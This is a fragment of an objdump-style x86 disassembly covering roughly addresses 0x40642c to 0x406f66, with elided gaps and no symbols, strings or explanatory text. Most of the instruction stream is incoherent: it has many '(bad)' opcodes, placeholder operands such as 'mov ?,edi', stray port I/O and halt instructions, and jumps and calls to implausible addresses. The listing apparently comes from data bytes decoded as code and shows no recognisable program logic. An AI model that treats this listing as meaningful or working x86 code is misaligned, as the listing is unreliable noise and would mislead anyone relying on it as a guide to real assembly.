  40642c:	call   0x406524
	...
  406455:	add    BYTE PTR [eax],al
  406457:	shl    DWORD PTR [edx],cl
  406459:	inc    ecx
  40645a:	add    al,0x20
  40645c:	pop    ebx
  40645d:	jmp    0xe93224fd
  406462:	add    ecx,DWORD PTR [edx+esi*1+0x54]
  406466:	xor    BYTE PTR [ebx+0x318d9632],dh
  40646c:	arpl   WORD PTR [ecx-0x79cd2c32],ax
  406472:	pushf  
  406473:	popa   
  406474:	xor    BYTE PTR [esi-0x73],bh
  406477:	in     al,dx
  406478:	xor    DWORD PTR [eax],eax
  40647a:	cld    
  40647b:	xchg   DWORD PTR [edx],edi
  40647d:	cli    
  40647e:	sahf   
  40647f:	xchg   ecx,eax
  406480:	xor    ch,al
  406482:	mov    eax,0x6cff32a9
  406487:	fwait
  406488:	xchg   ebx,eax
  406489:	call   DWORD PTR [esi-0x67]
  40648c:	mov    ebp,DWORD PTR [eax-0x1d]
  40648f:	das    
  406490:	pushf  
  406491:	add    BYTE PTR [ecx-0x71],dl
  406494:	cmp    edi,edi
  406496:	xlat   BYTE PTR ds:[ebx]
  406498:	xlat   BYTE PTR ds:[ebx]
  406499:	push   ebx
  40649a:	ss cdq 
  40649c:	xor    al,BYTE PTR [ebx-0xcdfb94]
  4064a2:	and    BYTE PTR es:[edi-0x6d1c95bb],ah
  4064a9:	call   DWORD PTR [esi]
  4064ab:	cdq    
  4064ac:	inc    edi
  4064ad:	jb     0x40647c
  4064af:	pushf  
  4064b0:	fcom   DWORD PTR [edi+0x6]
  4064b3:	test   eax,0x6afe0431
  4064b8:	xchg   ebx,eax
  4064b9:	push   esi
	...
  4064e3:	add    BYTE PTR [eax-0x581e8acf],bl
  4064e9:	jmp    0xdde94bbc
  4064ee:	lods   al,BYTE PTR ds:[esi]
  4064ef:	inc    ecx
  4064f0:	mov    eax,ds:0x5edff31
  4064f5:	xor    bh,bh
  4064f7:	push   esp
  4064f8:	loopne 0x406533
  4064fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064fb:	mov    dh,0xa8
  4064fd:	xor    edi,edi
  4064ff:	je     0x406508
  406501:	xor    bh,bh
  406503:	mov    dh,0x98
  406505:	out    0x53,eax
  406507:	scas   al,BYTE PTR es:[edi]
  406508:	nop
  406509:	xor    edi,edi
  40650b:	sbb    al,0xb8
  40650d:	cmp    DWORD PTR [edi-0x14ce5f52],esp
  406513:	in     eax,0x5
  406515:	pop    ebx
  406516:	push   0xffffffe9
  406518:	nop
  406519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651a:	or     BYTE PTR [eax],al
  40651c:	lods   eax,DWORD PTR ds:[esi]
  40651d:	mov    ds:0xdf12ffcf,eax
  406522:	mov    ah,0x54
  406524:	adc    bl,bh
  406526:	(bad)  
  406527:	call   0x3f50e9
  40652c:	add    cl,BYTE PTR [ecx-0x212d00a4]
  406532:	out    0xbd,eax
  406534:	daa    
  406535:	(bad)  
  406537:	sub    ebp,DWORD PTR [esi]
  406539:	push   esi
  40653a:	push   esi
  40653b:	push   eax
  40653c:	test   BYTE PTR [ebp-0x18],bl
  40653f:	cmp    edx,ebx
  406541:	pop    ebp
  406542:	add    BYTE PTR [ecx-0x1ee48],cl
	...
  406570:	add    dl,dh
  406572:	fidivr DWORD PTR [esp+ebp*1+0xfedf02]
  406579:	mov    DWORD PTR [edi],edi
  40657b:	addr16 inc edx
  40657d:	gs pushf 
  40657f:	add    bh,bh
  406581:	enter  0xfe11,0xff
  406585:	and    dl,ah
  406587:	mov    ebx,0xb5d05bd
  40658c:	ror    BYTE PTR [ecx-0x3a6a73ce],0xdf
  406593:	(bad)  
  406594:	push   DWORD PTR [edi]
  406596:	in     al,0xcf
  406598:	inc    ebx
  406599:	out    dx,al
  40659a:	add    DWORD PTR [ebp+0xc],esi
  40659d:	sbb    dl,0x2f
  4065a0:	call   edx
  4065a2:	in     al,0x4f
  4065a4:	call   0x41089e
  4065a9:	outs   dx,DWORD PTR ds:[esi]
  4065aa:	cmp    ecx,DWORD PTR [ebp+eax*4-0x11a3b]
  4065b1:	and    eax,0x8d0874e4
  4065b6:	jno    0x406587
  4065b8:	call   DWORD PTR [edx+0x1cfc74e4]
  4065be:	leave  
  4065bf:	adc    BYTE PTR [eax],cl
  4065c1:	mov    ah,0xe8
  4065c3:	mov    edx,0x2f799bff
  4065c8:	leave  
  4065c9:	pop    esi
  4065ca:	add    edx,DWORD PTR ss:[ebp-0x69]
  4065ce:	(bad)  
  4065cf:	test   ah,al
  4065d1:	je     0x40657c
  4065d3:	mov    edi,edi
	...
  4065fd:	add    BYTE PTR [ecx+0x735086ff],ch
  406603:	pop    es
  406604:	idiv   esi
  406606:	xor    DWORD PTR [ebx-0x65e3bec4],esp
  40660c:	sbb    eax,0xfe421cbe
  406611:	mov    edi,0xa3b723
  406616:	sbb    al,0x42
  406618:	ret    0x4445
  40661b:	inc    edx
  40661c:	add    eax,DWORD PTR [eax]
  40661e:	sbb    al,0x81
  406620:	inc    ecx
  406621:	hlt    
  406622:	xor    edi,DWORD PTR [ecx]
  406624:	add    eax,DWORD PTR [eax]
  406626:	mov    dh,0x41
  406628:	sbb    eax,0x98b79100
  40662d:	neg    DWORD PTR [ebx]
  40662f:	pop    ecx
  406630:	xor    al,0x6a
  406632:	sbb    al,0xbf
  406634:	inc    ecx
  406635:	hlt    
  406636:	ins    BYTE PTR es:[edi],dx
  406637:	mov    bh,0x81
  406639:	hlt    
  40663a:	or     eax,DWORD PTR [ecx-0x76]
  40663d:	push   eax
  40663e:	sti    
  40663f:	mov    cs,WORD PTR [edi+edi*8+0x549b0e69]
  406646:	stos   BYTE PTR es:[edi],al
  406647:	inc    ecx
  406648:	add    ecx,DWORD PTR [ebx]
  40664a:	fadd   QWORD PTR [ebp+0x4181e901]
  406650:	add    eax,DWORD PTR [eax]
  406652:	lahf   
  406653:	scas   al,BYTE PTR es:[edi]
  406654:	xchg   edi,eax
  406655:	test   ebx,0x127403e8
  40665b:	lds    ecx,FWORD PTR [eax-0x14]
  40665e:	mov    bl,0x5a
  406660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406661:	mov    al,BYTE PTR [eax]
	...
  40668b:	sbb    esp,DWORD PTR [edi+0x33618ae4]
  406691:	adc    BYTE PTR [ecx+0x34],0xab
  406695:	cmp    BYTE PTR [ebp+0x1c],al
  406698:	fisubr WORD PTR [ebx-0x71]
  40669b:	mov    ebp,DWORD PTR [edi]
  40669d:	jle    0x4066d2
  40669f:	je     0x40663a
  4066a1:	aaa    
  4066a2:	add    ebx,DWORD PTR [esp+eiz*2]
  4066a5:	test   eax,0x6bdded0f
  4066aa:	fwait
  4066ab:	imul   ebp,DWORD PTR [edi],0x5e
  4066ae:	xor    ebx,DWORD PTR [ecx+0x63925cd5]
  4066b4:	das    
  4066b5:	mov    ecx,0x465ed18a
  4066ba:	sar    BYTE PTR [edx+eiz*4],1
  4066bd:	test   al,0x3
  4066bf:	xor    al,0x15
  4066c1:	sbb    eax,0x2963438a
  4066c6:	bswap  ebp
  4066c8:	loope  0x406735
  4066ca:	xchg   ebx,eax
  4066cb:	sub    ebp,DWORD PTR [edi]
  4066cd:	push   ds
  4066ce:	sbb    ebx,DWORD PTR ds:0x2349065b
  4066d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066d5:	loope  0x406672
  4066d7:	arpl   WORD PTR ds:0xf09f8a06,bx
  4066dd:	or     al,0x92
  4066df:	or     ebp,DWORD PTR [edi]
  4066e1:	call   0xea0176f6
  4066e6:	mov    dh,BYTE PTR [ecx+0x63]
  4066e9:	rcl    eax,1
  4066eb:	loope  0x40671b
  4066ed:	ficomp WORD PTR [ebp+0x0]
	...
  406717:	add    BYTE PTR [esi],dl
  406719:	shr    eax,0x88
  40671c:	imul   esp,DWORD PTR [ebx-0x3f],0xc62ee9dc
  406723:	mov    DWORD PTR [ecx-0x347649bd],ecx
  406729:	add    BYTE PTR cs:[eax+ebp*4+0x26],bh
  40672e:	jmp    FWORD PTR [esi-0x6ef7575b]
  406734:	repnz sbb al,0xff
  406737:	sahf   
  406738:	xchg   ebp,eax
  406739:	call   0x2ed6062d
  40673e:	call   0xff6f3674
  406743:	xchg   BYTE PTR [ebx+0x33],dl
  406746:	jmp    0xff6efc1c
  40674b:	jbe    0x406760
  40674d:	das    
  40674e:	call   0x9b4a48
  406753:	xor    BYTE PTR [edx+0x63],bl
  406756:	add    BYTE PTR [eax+ebp*8-0x43d27ec2],dh
  40675d:	dec    DWORD PTR es:[esi-0x2d]
  406761:	xchg   edi,eax
  406762:	cld    
  406763:	cdq    
  406764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406765:	test   al,0xc
  406767:	ds pop ebx
  406769:	cmp    ecx,DWORD PTR [eax-0x58]
  40676c:	pop    ds
  40676d:	inc    ebx
  40676e:	pop    ebx
  40676f:	ins    BYTE PTR es:[edi],dx
  406770:	and    BYTE PTR [ebx+0xb],bl
  406773:	sub    DWORD PTR ds:0x1fe852d7,esi
  406779:	pop    ebx
  40677a:	(bad)  
  40677b:	lods   al,BYTE PTR ds:[esi]
	...
  4067a4:	add    BYTE PTR [edi+0x1fe9005b],dl
  4067aa:	push   ss
  4067ab:	inc    ebp
  4067ac:	std    
  4067ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ae:	push   ebp
  4067af:	add    cl,ch
  4067b1:	sub    DWORD PTR [ebx+0x6a],ebx
  4067b4:	jmp    0xe9aac2da
  4067b9:	jb     0x406753
  4067bb:	hlt    
  4067bc:	cmp    DWORD PTR [ebx-0x28],ebp
  4067bf:	repz (bad) 
  4067c1:	xchg   esp,eax
  4067c2:	sub    eax,0x3312d650
  4067c7:	call   DWORD PTR [esp+eiz*4+0x42]
  4067cb:	sub    eax,0x599800
  4067d0:	or     esi,DWORD PTR [ebp+0x5d]
  4067d3:	add    eax,0x58e3e9
  4067d8:	add    BYTE PTR [ebp-0x6a],bl
  4067db:	dec    eax
  4067dc:	inc    ecx
  4067dd:	(bad)
  4067e0:	or     al,0x8d
  4067e2:	arpl   sp,dx
  4067e4:	dec    DWORD PTR [edx-0x72f7497]
  4067ea:	lods   al,BYTE PTR ds:[esi]
  4067eb:	hlt    
  4067ec:	neg    DWORD PTR [edx-0x52adb01e]
  4067f2:	push   ebx
  4067f3:	aam    0xff
  4067f5:	or     dh,BYTE PTR [ecx-0x1d0d0f7b]
  4067fb:	(bad)  
  4067fc:	call   0x3f5242
  406801:	dec    edi
  406802:	pop    ecx
  406803:	push   0x98a459
  406808:	inc    DWORD PTR [eax]
	...
  406832:	mov    al,0xc9
  406834:	idiv   bh
  406836:	(bad)  
  406838:	xor    al,0xe1
  40683a:	lea    ebx,[eax-0x190e1800]
  406840:	(bad)  
  406841:	(bad)  
  406842:	mov    esp,0xfaf7e4ac
  406847:	loop   0x4068b2
  406849:	add    BYTE PTR [ebp+0x35415177],cl
  40684f:	loop   0x406805
  406851:	lock xor ah,bl
  406854:	(bad)  
  406855:	call   eax
  406857:	stc    
  406858:	inc    edi
  406859:	inc    ecx
  40685a:	cmc    
  40685b:	shl    BYTE PTR [ebp-0x772af52d],1
  406861:	test   ecx,edi
  406863:	fdiv   st(6),st
  406865:	dec    DWORD PTR [edi+0x57]
  406868:	push   0x96246b
  40686d:	call   FWORD PTR [edi+ecx*8]
  406870:	xchg   ebx,eax
  406871:	neg    ebx
  406873:	sbb    eax,0x6abd3587
  406878:	inc    ebp
  406879:	add    BYTE PTR [edx+ebp*4-0x443c004d],dh
  406880:	sub    eax,0x8386fdb3
  406886:	jno    0x406866
  406888:	mov    ?,edi
  40688a:	stos   DWORD PTR es:[edi],eax
  40688b:	inc    edx
  40688c:	cmovns ebx,DWORD PTR [edi-0x64086779]
  406893:	fld    QWORD PTR [ebx]
  406895:	je     0x406897
	...
  4068bf:	fadd   st(0),st
  4068c1:	dec    ecx
  4068c2:	call   0xc8165a
  4068c7:	or     ch,ch
  4068c9:	sbb    al,BYTE PTR [eax]
  4068cb:	sbb    al,0xad
  4068cd:	inc    esi
  4068ce:	(bad)  
  4068cf:	jmp    0x593403fd
  4068d4:	lea    eax,[edi-0x70695601]
  4068da:	call   FWORD PTR [ebx-0x63]
  4068dd:	adc    DWORD PTR [eax],ecx
  4068df:	inc    esp
  4068e0:	std    
  4068e1:	mov    bh,0xff
  4068e3:	dec    ebx
  4068e4:	ins    DWORD PTR es:[edi],dx
  4068e5:	push   ecx
  4068e6:	call   0xffc7ce36
  4068eb:	mov    cl,0x39
  4068ed:	fwait
  4068ee:	cmp    DWORD PTR [ecx+0x75],esp
  4068f1:	xchg   edi,edi
  4068f3:	jno    0x40694b
  4068f5:	(bad)  
  4068f6:	jmp    DWORD PTR [ebx]
  4068f8:	inc    ebp
  4068f9:	adc    DWORD PTR [eax],ecx
  4068fb:	add    al,0x19
  4068fd:	mov    eax,0x515513ff
  406902:	in     al,0x13
  406904:	sub    eax,0x5211e886
  406909:	xchg   edi,edi
  40690b:	sti    
  40690c:	cbw    
  40690e:	div    ebx
  406910:	pop    edx
  406911:	out    0x9b,al
  406913:	push   ds
  406914:	or     ebx,esi
  406916:	xchg   bl,ah
  406918:	in     eax,0xc0
  40691a:	mov    ds,ebx
  40691c:	sub    eax,ecx
  40691e:	mov    fs,ebx
  406920:	sub    eax,esi
  406922:	xchg   BYTE PTR [eax],al
	...
  40694c:	xchg   ecx,eax
  40694d:	sub    dh,BYTE PTR [esi+0x3c2bc386]
  406953:	cld    
  406954:	ret    
  406955:	cmc    
  406956:	scas   al,BYTE PTR es:[edi]
  406957:	xchg   BYTE PTR [ebx-0x4c6ca3d5],dh
  40695d:	sub    ebx,DWORD PTR [esi-0x69e43d65]
  406963:	xchg   BYTE PTR [ebx-0x2f636e6b],bl
  406969:	sub    al,0x86
  40696b:	xchg   BYTE PTR [ebx-0x7964825b],cl
  406971:	out    dx,eax
  406972:	call   0xe158ce7a
  406977:	add    ecx,ecx
  406979:	fist   WORD PTR [edx+eax*4+0x60]
  40697d:	rol    DWORD PTR cs:[ebx],cl
  406980:	neg    BYTE PTR [ecx+0x56]
  406983:	adc    BYTE PTR [ebx+eax*2],ah
  406986:	pop    ecx
  406987:	mov    bh,0x53
  406989:	sub    esi,DWORD PTR [eax+0x40]
  40698c:	dec    eax
  40698d:	ret    0x33bb
  406990:	fstp   QWORD PTR [edx+0x36]
  406993:	adc    BYTE PTR [ebx+eax*2],ah
  406996:	lds    eax,FWORD PTR [ebp+0x74912b33]
  40699c:	int3   
  40699d:	cdq    
  40699e:	jmp    0x1a31329
  4069a3:	sbb    ch,BYTE PTR cs:[ebx]
  4069a6:	push   cs
  4069a7:	sbb    ecx,ebp
  4069a9:	mov    ebp,DWORD PTR [eax-0xe4ef4fd]
  4069af:	fwait
	...
  4069d8:	add    BYTE PTR [esi+0x29],dl
  4069db:	add    dh,dh
  4069dd:	mov    eax,ds:0x5899d8b3
  4069e2:	pop    ebx
  4069e3:	call   FWORD PTR [eax+ebp*8+0x42]
  4069e7:	das    
  4069e8:	fcomp  QWORD PTR [ecx+0xee9682a]
  4069ee:	pushf  
  4069ef:	add    dh,cl
  4069f1:	and    edx,DWORD PTR [ebx-0x18]
  4069f4:	or     esp,DWORD PTR [ebx-0x18ae00d6]
  4069fa:	mov    eax,DWORD PTR [ecx-0x17]
  4069fd:	mov    al,ds:0xc3c108b0
  406a02:	daa    
  406a03:	jmp    DWORD PTR [esi-0x61034f5f]
  406a09:	adc    edx,DWORD PTR [ebx-0x18]
  406a0c:	mov    bl,0xd4
  406a0e:	sub    bh,bh
  406a10:	mov    al,ds:0x1c005f5e
  406a15:	add    eax,0x1fe96837
  406a1a:	cmp    bh,BYTE PTR [esi-0xa8d48a]
  406a20:	hlt    
  406a21:	ja     0x406a65
  406a23:	push   edx
  406a24:	pop    esp
  406a25:	mov    eax,ds:0x602bc92a
  406a2a:	sub    dl,BYTE PTR [edx+eiz*2-0x4c]
  406a2e:	fidivr WORD PTR [ebp+ebx*8+0x1f]
  406a32:	pop    edx
  406a33:	test   BYTE PTR [ebx],cl
  406a35:	pop    ds
  406a36:	pop    ebx
  406a37:	add    BYTE PTR [esi],bh
  406a39:	adc    edx,DWORD PTR [edi-0x18]
  406a3c:	mov    ch,0x0
	...
  406a66:	test   DWORD PTR [edx],ebp
  406a68:	jmp    edx
  406a6a:	pop    edi
  406a6b:	mov    al,0x10
  406a6d:	xchg   ecx,eax
  406a6e:	loop   0x406a02
  406a70:	inc    ecx
  406a71:	jmp    0x14d1b0e
  406a76:	adc    cl,BYTE PTR ds:0xa0970eff
  406a7c:	or     al,0x0
  406a7e:	scas   eax,DWORD PTR es:[edi]
  406a7f:	pop    ebp
  406a80:	push   0x9ca495
  406a85:	push   0x416e65
  406a8a:	add    bl,BYTE PTR [ecx]
  406a8c:	loopne 0x406ad6
  406a8e:	xor    al,0x5f
  406a90:	call   0xff1f11ae
  406a95:	or     eax,DWORD PTR [ebp+0x15501e59]
  406a9b:	loopne 0x406b11
  406a9d:	or     al,0xed
  406a9f:	stos   DWORD PTR es:[edi],eax
  406aa0:	sar    bh,cl
  406aa2:	sub    BYTE PTR [ebp+0x50],0xff
  406aa6:	clc    
  406aa7:	es out 0x91,eax
  406aaa:	sbb    dh,0xfe
  406aad:	call   0x3f5a4b
  406ab2:	(bad)  
  406ab3:	dec    ch
  406ab5:	push   DWORD PTR [edx+0x8680043]
  406abb:	ins    DWORD PTR es:[edi],dx
  406abc:	inc    ecx
  406abd:	add    BYTE PTR ds:0x754151bf,ch
  406ac3:	inc    ebp
  406ac4:	add    al,BYTE PTR [eax]
  406ac6:	test   ebp,ebx
  406ac8:	out    0xe1,eax
	...
  406af2:	add    BYTE PTR [esi+ebx*8+0x5a350bfe],dl
  406af9:	push   ds
  406afa:	push   eax
  406afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afc:	fidiv  WORD PTR [esp+ecx*1-0x23]
  406b00:	jae    0x406ad4
  406b02:	jmp    edx
  406b04:	ins    DWORD PTR es:[edi],dx
  406b05:	push   eax
  406b06:	dec    DWORD PTR [eax+0x259e725]
  406b0c:	(bad)  
  406b0e:	call   0x3f5ab4
  406b13:	fld    QWORD PTR [esi+0x4402ffce]
  406b19:	add    BYTE PTR [eax-0x58],ch
  406b1c:	ins    BYTE PTR es:[edi],dx
  406b1d:	inc    ecx
  406b1e:	add    BYTE PTR [edx+ebx*8],bl
  406b21:	mov    edi,0x84325d51
  406b26:	xor    eax,0x41eafd
  406b2b:	hlt    
  406b2c:	mov    dh,BYTE PTR [edx-0x3cc20401]
  406b32:	je     0x406b46
  406b34:	ret    0xff32
  406b37:	jno    0x406b67
  406b39:	imul   esp,DWORD PTR [ecx],0xffffffce
  406b3c:	or     DWORD PTR [ebx-0x6ee93b0],eax
  406b42:	pop    es
  406b43:	les    edx,FWORD PTR [edx-0x7d]
  406b46:	dec    ebx
  406b48:	or     dh,bh
  406b4a:	int    0xc3
  406b4c:	jmp    0xf22ad9bc
  406b51:	sub    BYTE PTR [edx+0x1c],0x9a
  406b55:	cdq    
  406b56:	push   ecx
	...
  406b7f:	add    BYTE PTR [ebp+0x32],bl
  406b82:	jmp    0x406b46
  406b84:	dec    ebp
  406b85:	jae    0x406b8b
  406b87:	push   0x8003321e
  406b8c:	test   BYTE PTR [edx+0x55],al
  406b8f:	dec    DWORD PTR [ebx+0x2274432d]
  406b95:	inc    edx
  406b96:	aam    0xfe
  406b98:	icebp  
  406b99:	cmp    eax,0xb94de96b
  406b9e:	adc    DWORD PTR [eax-0x34],0xffffffc0
  406ba2:	stc    
  406ba3:	pop    es
  406ba4:	je     0x406b30
  406ba6:	cmp    bh,0x5b
  406ba9:	call   0x366c:0x9953ce3f
  406bb0:	pop    edx
  406bb1:	mov    eax,ds:0xc2c96883
  406bb6:	ret    
  406bb7:	(bad)  
  406bb8:	cmp    ah,bh
  406bba:	push   cs
  406bbb:	call   0xffc3af24
  406bc0:	int3   
  406bc1:	pop    edx
  406bc2:	mov    ecx,0x1152a982
  406bc7:	dec    ebx
  406bc8:	sbb    ch,BYTE PTR [eax]
  406bca:	push   ss
  406bcb:	ins    BYTE PTR es:[edi],dx
  406bcc:	sbb    DWORD PTR ss:[esi],ecx
  406bcf:	or     DWORD PTR [ebx],0xffffffae
  406bd2:	cmc    
  406bd3:	imul   ebp,DWORD PTR [esi],0x19
  406bd6:	inc    BYTE PTR [edx+0x3e11ce5]
  406bdc:	dec    ecx
  406bdd:	aam    0xfc
  406bdf:	xchg   al,ah
  406be1:	cs push ebx
  406be3:	add    al,0x0
	...
  406c0d:	jbe    0x406c6c
  406c0f:	fdivp  st(0),st
  406c11:	and    esi,DWORD PTR [ebx]
  406c13:	sbb    eax,0x6027d34f
  406c18:	enter  0xb2c7,0xec
  406c1c:	add    al,0x1c
  406c1e:	pop    ebx
  406c1f:	ror    DWORD PTR [ecx],1
  406c21:	jmp    0x4123:0x598cb627
  406c28:	or     BYTE PTR ds:0x2982e95b,bl
  406c2e:	and    edx,DWORD PTR [ecx-0x16a52a7c]
  406c34:	push   cs
  406c35:	pop    esp
  406c36:	scas   al,BYTE PTR es:[edi]
  406c37:	cmc    
  406c38:	inc    eax
  406c39:	and    BYTE PTR [edx-0x17],bl
  406c3c:	add    ecx,DWORD PTR [ebx]
  406c3e:	push   esi
  406c3f:	jle    0x406c39
  406c41:	jae    0x406c6a
  406c43:	cld    
  406c44:	or     eax,DWORD PTR [edx+edx*8+0x336b826e]
  406c4b:	icebp  
  406c4c:	sub    cl,0x22
  406c4f:	push   ecx
  406c50:	ret    0x2769
  406c53:	push   esi
  406c54:	in     eax,dx
  406c55:	sti    
  406c56:	xor    bh,cl
  406c58:	push   ebp
  406c59:	dec    ebx
  406c5a:	daa    
  406c5b:	cdq    
  406c5c:	or     cl,0x52
  406c5f:	push   ecx
  406c60:	icebp  
  406c61:	cmp    DWORD PTR [edi],esp
  406c63:	add    BYTE PTR [esi],dh
  406c65:	inc    ecx
  406c66:	inc    ecx
  406c67:	call   0xff683e55
  406c6c:	repnz fild QWORD PTR [esi+0x9114]
	...
  406c97:	add    BYTE PTR [eax],al
  406c99:	add    BYTE PTR [eax-0x1016be74],ah
  406c9f:	mov    WORD PTR ds:[eax],?
  406ca2:	sahf   
  406ca3:	es push eax
  406ca5:	push   es
  406ca6:	add    al,0x5f
  406ca8:	call   0xff670a5b
  406cad:	cmp    DWORD PTR [edx],0x33
  406cb0:	loope  0x406cca
  406cb2:	sahf   
  406cb3:	or     ebp,DWORD PTR es:[ecx+0x68684ae4]
  406cba:	out    dx,eax
  406cbb:	fwait
  406cbc:	add    BYTE PTR [ecx],bh
  406cbe:	inc    eax
  406cbf:	mov    eax,0x8b9dced1
  406cc4:	(bad)  
  406cc5:	cmp    al,0x10
  406cc7:	xor    esi,DWORD PTR [eax]
  406cc9:	mov    edi,0xd56a269d
  406cce:	inc    edi
  406ccf:	sbb    ecx,edx
  406cd1:	scas   al,BYTE PTR es:[edi]
  406cd2:	popf   
  406cd3:	push   edx
  406cd4:	rcr    BYTE PTR ds:0x3881b304,0x5f
  406cdb:	es dec edi
  406cdd:	sub    DWORD PTR [esi+0xb],0x25708eff
  406ce4:	jne    0x406cd7
  406ce6:	test   DWORD PTR [ebx-0x2],0xb19d7e
  406ced:	add    DWORD PTR [edx+0x77e9418c],esp
  406cf3:	(bad)  
  406cf4:	push   eax
  406cf5:	test   al,0x1f
  406cf7:	es xor eax,0x9b6848
  406cfd:	inc    ecx
	...
  406d26:	add    BYTE PTR [ecx+0x16],ch
  406d29:	dec    DWORD PTR [esi+0x70]
  406d2c:	and    eax,0xb24d0075
  406d31:	icebp  
  406d32:	std    
  406d33:	cli    
  406d34:	fld    TBYTE PTR [ecx+0x0]
  406d37:	pop    ebp
  406d38:	int    0x50
  406d3a:	inc    ecx
  406d3b:	xor    eax,0x74519f32
  406d40:	pop    edx
  406d41:	push   DWORD PTR ds:0x401724
  406d47:	sbb    eax,0x1affd070
  406d4c:	pop    eax
  406d4d:	shl    BYTE PTR [ebx+eiz*8-0x30],0x44
  406d52:	hlt    
  406d53:	cli    
  406d54:	sub    al,0xf3
  406d56:	push   DWORD PTR [eax+0x52]
  406d59:	call   0xff1b660f
  406d5e:	inc    DWORD PTR [eax-0x5d]
  406d61:	call   0xff1af567
  406d66:	push   0xffffffc5
  406d68:	xor    DWORD PTR [ecx+0x685ef451],ecx
  406d6e:	ret    
  406d6f:	and    al,0x1a
  406d71:	(bad)  
  406d72:	(bad)  
  406d73:	mov    al,0xb8
  406d75:	dec    eax
  406d76:	inc    ecx
  406d77:	lds    esi,FWORD PTR [ecx-0x25852ffe]
  406d7d:	dec    edi
  406d7e:	inc    DWORD PTR [eax]
  406d80:	push   edi
  406d81:	call   0xff1b2626
  406d86:	push   0xffffff85
  406d88:	xor    DWORD PTR [ecx+edx*2+0x0],edx
	...
  406db3:	add    BYTE PTR [edi+ebx*2],dh
  406db6:	push   0xff1a24c3
  406dbb:	(bad)  
  406dbc:	mov    al,0xb8
  406dbe:	dec    eax
  406dbf:	inc    ecx
  406dc0:	test   DWORD PTR [ecx-0x2505301e],esi
  406dc6:	or     al,al
  406dc8:	inc    ecx
  406dc9:	inc    ebx
  406dca:	mov    DWORD PTR [ebp-0xf],eax
  406dcd:	fidiv  DWORD PTR [esp+esi*8+0x1c]
  406dd1:	(bad)  
  406dd2:	test   BYTE PTR [edi],0x34
  406dd5:	adc    edi,DWORD PTR [esi-0x1]
  406dd8:	inc    ebx
  406dd9:	pushf  
  406dda:	div    bl
  406ddc:	inc    esp
  406ddd:	mov    ds:0x1933ff4f,eax
  406de2:	add    ebp,DWORD PTR [eax-0x6a]
  406de5:	ret    0xffc1
  406de8:	mov    ebx,0x1c40d293
  406ded:	retf   0x4
  406df0:	sbb    al,0xb2
  406df2:	imul   esi,DWORD PTR [edx+0x508055db],0x3
  406df9:	test   al,0xb
  406dfb:	call   0xffbf954c
  406e00:	xchg   BYTE PTR [edx],dh
  406e02:	jmp    0x406d98
  406e04:	dec    ebp
  406e05:	repz add ch,BYTE PTR [eax-0x44]
  406e09:	arpl   bp,ax
  406e0b:	inc    DWORD PTR [ebx+0x30]
  406e0e:	add    eax,DWORD PTR [eax]
  406e10:	pushf  
  406e11:	sbb    dl,BYTE PTR [ebx+0xb15cbcf]
  406e17:	rol    BYTE PTR [eax],0x0
	...
  406e3e:	add    BYTE PTR [eax],al
  406e40:	add    BYTE PTR [eax+0x4],cl
  406e43:	mov    WORD PTR [ebp-0x50],es
  406e46:	in     eax,0xf8
  406e48:	repz mov bl,0x67
  406e4b:	or     al,0xe8
  406e4d:	or     eax,0xa3ff7ef7
  406e52:	inc    edi
  406e53:	js     0x406e3d
  406e55:	std    
  406e56:	cmc    
  406e57:	jle    0x406e58
  406e59:	push   es
  406e5a:	xor    ch,bl
  406e5c:	mov    ebp,ebp
  406e5e:	jb     0x406e64
  406e60:	push   0xffc5435f
  406e65:	add    esi,DWORD PTR [eax]
  406e67:	add    eax,DWORD PTR [eax]
  406e69:	pushf  
  406e6a:	(bad)  
  406e6c:	into   
  406e6d:	imul   esi,DWORD PTR [ebp+0x5ae9fed4],0xfffffff1
  406e74:	imul   ebx,DWORD PTR ds:0xc67f5e26,0x5a
  406e7b:	rcr    DWORD PTR [eax-0x14166613],0x5e
  406e82:	mov    ch,BYTE PTR [eax-0x16a73bfd]
  406e88:	add    ebx,DWORD PTR [ebx+esi*1+0x242b4ead]
  406e8f:	loop   0x406ed4
  406e91:	test   al,0x4c
  406e93:	jo     0x406e5e
  406e95:	(bad)  
  406e97:	xchg   esp,eax
  406e98:	ja     0x406ead
  406e9a:	scas   al,BYTE PTR es:[edi]
  406e9b:	loope  0x406f08
  406e9d:	fisub  WORD PTR [esi]
  406e9f:	push   cs
  406ea0:	jg     0x406ea5
  406ea2:	scas   al,BYTE PTR es:[edi]
  406ea3:	std    
  406ea4:	imul   eax,DWORD PTR [eax],0x0
	...
  406ecb:	add    BYTE PTR [eax],al
  406ecd:	add    BYTE PTR [esi],cl
  406ecf:	pop    ss
  406ed0:	(bad)  
  406ed1:	jle    0x406ec6
  406ed3:	lods   eax,DWORD PTR ds:[esi]
  406ed4:	cmc    
  406ed5:	jle    0x406f48
  406ed7:	push   ebx
  406ed8:	add    DWORD PTR [ecx+0x4ce623d5],ecx
  406ede:	ficomp WORD PTR [esi-0x17]
  406ee1:	fsub   DWORD PTR [esi+0x1c044136]
  406ee7:	xor    al,0x8f
  406ee9:	jle    0x406f34
  406eeb:	push   edi
  406eec:	xabort 0x23
  406eef:	xor    edi,DWORD PTR [esp+esi*2+0x41a023b3]
  406ef6:	adc    al,0x5b
  406ef8:	adc    al,0x8b
  406efa:	mov    al,0xd9
  406efc:	lods   al,BYTE PTR ds:[esi]
  406efd:	mov    bh,0x9a
  406eff:	and    ebx,DWORD PTR [esi-0x691d66ba]
  406f05:	jle    0x406e92
  406f07:	pop    edx
  406f08:	jmp    0x2c108b10
  406f0d:	adc    BYTE PTR [edi],ah
  406f0f:	sbb    esi,ebp
  406f11:	or     BYTE PTR [edx+eiz*2+0x5e64e900],bl
  406f18:	jmp    0x9b882d
  406f1d:	push   sp
  406f1f:	dec    edi
  406f20:	call   0xff645a1e
  406f25:	loop   0x406f06
  406f27:	lods   eax,DWORD PTR ds:[esi]
  406f28:	xadd   DWORD PTR [eax],ebx
  406f2b:	mov    eax,DWORD PTR [ecx-0x17]
  406f2e:	mov    edx,0x510cad
	...
  406f5b:	popa   
  406f5c:	adc    al,0xff
  406f5e:	ss mov dh,0x55
  406f61:	push   0x9a4fe7
  406f66:	es adc al,0x57
